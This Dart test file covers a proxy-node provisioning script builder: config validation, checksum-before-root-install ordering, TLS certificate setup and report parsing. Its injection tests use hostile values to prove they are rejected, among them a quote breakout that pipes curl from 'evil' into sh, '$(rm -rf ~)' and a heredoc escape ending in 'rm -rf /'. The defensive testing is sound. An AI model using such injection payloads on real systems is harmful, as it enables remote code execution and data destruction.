import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:xveil/data/node/node_provisioner.dart';

void main() {
  // A well-known 64-hex digest used purely as a fixture.
  const sha =
      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const cfg = NodeProvisionConfig(
    releaseUrl: 'https://example.com/releases/veil-cli-x86_64-linux-musl',
    expectedSha256: sha,
    obfs4PskB64: 'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=',
    listenPort: 5556,
    runExit: true,
  );

  test('config validation', () {
    expect(cfg.isValid, isTrue);
    expect(
      const NodeProvisionConfig(
        releaseUrl: 'http://x',
        expectedSha256: sha,
        obfs4PskB64: 'a',
      ).isValid,
      isFalse,
    ); // not https
    expect(
      const NodeProvisionConfig(
        releaseUrl: 'https://x',
        expectedSha256: sha,
        obfs4PskB64: '',
      ).isValid,
      isFalse,
    ); // no psk
    // A missing / malformed checksum is rejected — provisioning must never run
    // an unverified root binary (PROVISION-RCE).
    expect(
      const NodeProvisionConfig(
        releaseUrl: 'https://x',
        expectedSha256: '',
        obfs4PskB64: 'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=',
      ).isValid,
      isFalse,
    );
    expect(
      const NodeProvisionConfig(
        releaseUrl: 'https://x',
        expectedSha256: 'not-a-sha',
        obfs4PskB64: 'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=',
      ).isValid,
      isFalse,
    );
  });

  test('rejects a release URL that could inject shell (PROVISION-RCE)', () {
    NodeProvisionConfig u(String url) => NodeProvisionConfig(
      releaseUrl: url,
      expectedSha256: sha,
      obfs4PskB64: 'CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=',
    );
    // The URL is interpolated into a root-sudo curl line; a quote-breakout or
    // any shell metacharacter must be refused even though it "starts with https".
    expect(u("https://x'; curl http://evil/p | sh #").isValid, isFalse);
    expect(u(r'https://x/$(rm -rf ~)').isValid, isFalse);
    expect(u('https://x/`id`').isValid, isFalse);
    expect(u('https://a b/c').isValid, isFalse); // space
    expect(u('https://x/a&b').isValid, isFalse); // & metachar
    expect(u('http://example.com/veil-cli').isValid, isFalse); // not https
    // A normal release-asset URL passes.
    expect(
      u(
        'https://github.com/org/repo/releases/download/v1.2.3/veil-cli-x86_64-unknown-linux-musl',
      ).isValid,
      isTrue,
    );
  });

  test('rejects an obfs4 PSK that is not clean base64 (heredoc safety)', () {
    NodeProvisionConfig p(String psk) => NodeProvisionConfig(
      releaseUrl: 'https://example.com/veil-cli',
      expectedSha256: sha,
      obfs4PskB64: psk,
    );
    // A value with a newline / the heredoc delimiter could break out of the
    // `<<'PSK_EOF'` block — valid base64 (no underscore, no newline) cannot.
    expect(p('not base64! with spaces').isValid, isFalse);
    expect(p('line1\nPSK_EOF\nrm -rf /').isValid, isFalse);
    expect(p('CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI=').isValid, isTrue);
  });

  test('script verifies the checksum BEFORE installing/running as root', () {
    final s = buildProvisionScript(cfg);
    expect(s, contains("curl -fsSL 'https://example.com/releases/"));
    // The checksum is verified against the download, and that check precedes
    // the `sudo install` — so a mismatched (tampered) binary aborts the script
    // before it is ever placed on PATH or executed as root.
    expect(s, contains("echo '$sha  /tmp/veil-cli' | sha256sum -c -"));
    final verifyAt = s.indexOf('sha256sum -c -');
    final installAt = s.indexOf('sudo install -o root -g root');
    expect(verifyAt, greaterThanOrEqualTo(0));
    expect(
      installAt,
      greaterThan(verifyAt),
      reason: 'checksum verification must come before sudo install',
    );
    expect(s, contains('CWz2E4fUutnZTr2KLjv62z1AUMWDORl1odamTdDdGAI='));
    expect(s, contains('/usr/local/bin/veil-cli'));
    expect(s, contains('/etc/systemd/system/veil.service'));
    expect(s, contains("obfs4-tcp://0.0.0.0:5556"));
    expect(s, contains("set_toml_scalar proxy.exit enabled 'true'"));
    expect(
      s,
      contains(
        "set_toml_scalar transport obfs4_psk_file "
        "'\"/var/lib/veil/obfs4_psk.b64\"'",
      ),
    );
    expect(s, isNot(contains('config set transport.obfs4_psk_file')));
    expect(s, isNot(contains('config set proxy.exit.enabled')));
    expect(s, contains('systemctl restart veil'));
    expect(s, contains('for _ in {1..30}'));
    expect(s, contains(r'if [ "$veil_status" != active ]'));
    expect(s, contains('NODE_ID:'));
    expect(s, contains('config get identity.node_id'));
    // Idempotent identity: only mines when node.toml lacks [Identity].
    expect(s, contains(r"grep -qE '^\[Identity\]'"));
  });

  test('exit can be disabled', () {
    final s = buildProvisionScript(
      NodeProvisionConfig(
        releaseUrl: cfg.releaseUrl,
        expectedSha256: sha,
        obfs4PskB64: cfg.obfs4PskB64,
        runExit: false,
      ),
    );
    expect(s, isNot(contains("set_toml_scalar proxy.exit enabled 'true'")));
    expect(s, contains("set_toml_scalar proxy.exit enabled 'false'"));
    expect(s, contains('# exit proxy disabled'));
  });

  test('multiple transports and optional tools are fully provisioned', () {
    final expanded = NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {
        NodeListenTransport.obfs4Tcp,
        NodeListenTransport.tcp,
        NodeListenTransport.wss,
      },
      transportPorts: const {
        NodeListenTransport.tcp: 9100,
        NodeListenTransport.wss: 443,
      },
      advertiseHost: 'node.example.com',
      tlsCertPath: '/etc/veil/server.pem',
      tlsKeyPath: '/etc/veil/server.key',
      extraArtifacts: const [
        NodeReleaseArtifact(
          component: NodeComponent.ogate,
          releaseUrl: 'https://example.com/ogate',
          expectedSha256: sha,
        ),
        NodeReleaseArtifact(
          component: NodeComponent.oproxyServer,
          releaseUrl: 'https://example.com/oproxy-server',
          expectedSha256: sha,
        ),
      ],
    );
    expect(expanded.isValid, isTrue);
    final script = buildProvisionScript(expanded);
    final lastVerify = script.lastIndexOf('sha256sum -c -');
    final firstInstall = script.indexOf('sudo install -o root -g root');
    expect(firstInstall, greaterThan(lastVerify));
    expect(script, contains('tcp://0.0.0.0:9100'));
    expect(script, contains('wss://0.0.0.0:443/veil'));
    expect(script, contains("--advertise 'wss://node.example.com:443/veil'"));
    expect(script, contains("--tls-cert '/etc/veil/server.pem'"));
    expect(script, contains('/etc/systemd/system/ogate.service'));
    expect(script, contains('/etc/systemd/system/oproxy-server.service'));
    expect(script, contains('gen-config'));
  });

  test('TLS transports fail closed without safe remote key paths', () {
    NodeProvisionConfig tls({String? cert, String? key}) => NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {NodeListenTransport.wss},
      tlsCertPath: cert,
      tlsKeyPath: key,
    );
    expect(tls().isValid, isFalse);
    expect(
      tls(cert: '/etc/veil/server.pem', key: '/etc/veil/server.key').isValid,
      isTrue,
    );
    expect(
      tls(cert: '/etc/veil/server.pem', key: "/tmp/key'; id #").isValid,
      isFalse,
    );
  });

  test('automatic TLS uses Let\'s Encrypt for a DNS name', () async {
    final automatic = NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {NodeListenTransport.wss},
      tlsCertificateMode: NodeTlsCertificateMode.automatic,
      tlsDomain: 'node.example.com',
      tlsEmail: 'operator@example.com',
      tlsAgreeToTerms: true,
    );
    expect(automatic.isValid, isTrue);

    final script = buildProvisionScript(automatic);
    expect(script, contains('certbot certonly --standalone'));
    expect(script, contains("--email 'operator@example.com'"));
    expect(script, contains("-d 'node.example.com'"));
    expect(
      script,
      contains('/etc/letsencrypt/renewal-hooks/deploy/xveil-veil'),
    );
    expect(
      script,
      contains("-m 0640 '/etc/letsencrypt/live/node.example.com/privkey.pem'"),
    );
    expect(
      script,
      contains("--tls-cert '/etc/veil/tls/letsencrypt-fullchain.pem'"),
    );
    expect(
      script.indexOf('certbot certonly'),
      lessThan(script.indexOf('listen add')),
    );
    final result = await Process.run('bash', ['-n', '-c', script]);
    expect(result.exitCode, 0, reason: '${result.stderr}\n$script');
  });

  test('automatic TLS falls back to a self-signed IP certificate', () async {
    final automatic = NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {NodeListenTransport.quic},
      tlsCertificateMode: NodeTlsCertificateMode.automatic,
      tlsDomain: '203.0.113.10',
      selfSignedDays: 730,
    );
    expect(automatic.isValid, isTrue);
    expect(automatic.automaticUsesLetsEncrypt, isFalse);

    final script = buildProvisionScript(automatic);
    expect(script, isNot(contains('certbot certonly')));
    expect(script, contains('openssl req -x509'));
    expect(script, contains('IP.1 = 203.0.113.10'));
    expect(script, contains('-days 730'));
    expect(script, contains("203.0.113.10|730"));
    expect(script, contains("-m 0640 /tmp/xveil-selfsigned-key.pem"));
    expect(script, contains("--tls-cert '/etc/veil/tls/selfsigned-cert.pem'"));
    expect(
      script.indexOf('openssl req'),
      lessThan(script.indexOf('listen add')),
    );
    final result = await Process.run('bash', ['-n', '-c', script]);
    expect(result.exitCode, 0, reason: '${result.stderr}\n$script');
  });

  test('explicit self-signed TLS writes a DNS SAN', () {
    final selfSigned = NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {NodeListenTransport.tls},
      tlsCertificateMode: NodeTlsCertificateMode.selfSigned,
      selfSignedName: 'internal.example.com',
    );
    expect(selfSigned.isValid, isTrue);
    expect(
      buildProvisionScript(selfSigned),
      contains('DNS.1 = internal.example.com'),
    );
  });

  test('generated TLS settings reject incomplete or unsafe values', () {
    NodeProvisionConfig generated({
      required NodeTlsCertificateMode mode,
      String? name,
      String? email,
      bool terms = false,
      int days = 365,
    }) => NodeProvisionConfig(
      releaseUrl: cfg.releaseUrl,
      expectedSha256: sha,
      obfs4PskB64: cfg.obfs4PskB64,
      transports: const {NodeListenTransport.wss},
      tlsCertificateMode: mode,
      tlsDomain: name,
      tlsEmail: email,
      tlsAgreeToTerms: terms,
      selfSignedName: name,
      selfSignedDays: days,
    );

    expect(
      generated(
        mode: NodeTlsCertificateMode.automatic,
        name: 'not a host',
      ).isValid,
      isFalse,
    );
    expect(
      generated(
        mode: NodeTlsCertificateMode.automatic,
        name: 'node.example.com',
      ).isValid,
      isFalse,
    );
    expect(
      generated(
        mode: NodeTlsCertificateMode.automatic,
        name: 'node.example.com',
        email: 'operator@example.com',
        terms: true,
      ).isValid,
      isTrue,
    );
    expect(
      generated(
        mode: NodeTlsCertificateMode.automatic,
        name: "node.example.com'; id #",
        email: 'operator@example.com',
        terms: true,
      ).isValid,
      isFalse,
    );
    expect(
      generated(
        mode: NodeTlsCertificateMode.selfSigned,
        name: '203.0.113.10',
        days: 0,
      ).isValid,
      isFalse,
    );
  });

  test('generated expanded provision script is valid bash', () async {
    final script = buildProvisionScript(cfg);
    final result = await Process.run('bash', ['-n', '-c', script]);
    expect(result.exitCode, 0, reason: '${result.stderr}\n$script');
  });

  // The report is the only channel through which a deployment tells the app
  // what it produced. Before it existed a run ended with a node id nobody could
  // dial, so the server stayed out of the peer list — these pin the parts that
  // made that a silent outcome rather than an error.
  group('provision report', () {
    const output = '''
STATUS: active
NODE_ID: 3d3575c9b6d728bc2d9b0b3a5fd9cd39449c0d9d47074623dda69ce4b63b4904
BOOTSTRAP_URI: veil:bootstrap?pk=VVxxLVptuXZ%2FqFV94aPP1daiz6ZYg2yf1JLbc1VHXhQ=&t=obfs4-tcp://0.0.0.0:5556&nc=AdW8kw==&a=ed25519
COMPONENTS: veil-cli,ogate,oproxy-server
''';

    test('reads the three facts a deployment reports', () {
      final r = parseProvisionReport(output);
      expect(
        r.nodeId,
        '3d3575c9b6d728bc2d9b0b3a5fd9cd39449c0d9d47074623dda69ce4b63b4904',
      );
      expect(r.components, {
        NodeComponent.veilCli,
        NodeComponent.ogate,
        NodeComponent.oproxyServer,
      });
      expect(r.invite, isNotNull);
    });

    test('a bind address nobody can dial is replaced by the one that worked', () {
      // `listen add` binds 0.0.0.0 and only advertises when the operator filled
      // in a public host. Left alone, the node's own invite tells peers to dial
      // 0.0.0.0 — the deployment succeeds and the peer entry is useless.
      final r = parseProvisionReport(output, reachableHost: '203.0.113.7');
      expect(r.invite, contains('t=obfs4-tcp://203.0.113.7:5556'));
      expect(r.invite, isNot(contains('0.0.0.0')));
    });

    test('an advertised host is never second-guessed', () {
      final advertised = output.replaceAll('0.0.0.0', 'node.example.org');
      final r = parseProvisionReport(advertised, reachableHost: '203.0.113.7');
      expect(r.invite, contains('t=obfs4-tcp://node.example.org:5556'));
      expect(r.invite, isNot(contains('203.0.113.7')));
    });

    test('loopback counts as undialable too', () {
      for (final host in ['127.0.0.1', 'localhost']) {
        final r = parseProvisionReport(
          output.replaceAll('0.0.0.0', host),
          reachableHost: '203.0.113.7',
        );
        expect(r.invite, contains('203.0.113.7'), reason: host);
      }
    });

    test('the rest of the invite survives the rewrite', () {
      final r = parseProvisionReport(output, reachableHost: '203.0.113.7');
      expect(r.invite, contains('pk=VVxxLVptuXZ%2FqFV94aPP1daiz6ZYg2yf1JLbc1VHXhQ='));
      expect(r.invite, contains('nc=AdW8kw=='));
      expect(r.invite, contains('a=ed25519'));
    });

    test('a run that reported nothing yields nothing, not a blank peer', () {
      final r = parseProvisionReport('STATUS: failed\n');
      expect(r.isEmpty, isTrue);
      expect(r.invite, isNull);
      expect(r.nodeId, isNull);
    });

    test('an unavailable invite is not mistaken for one', () {
      final r = parseProvisionReport(
        'NODE_ID: 3d3575c9b6d728bc2d9b0b3a5fd9cd39449c0d9d47074623dda69ce4b63b4904\n'
        'BOOTSTRAP_URI: (unavailable)\n',
      );
      expect(r.invite, isNull);
      expect(r.nodeId, isNotNull);
    });
  });
}
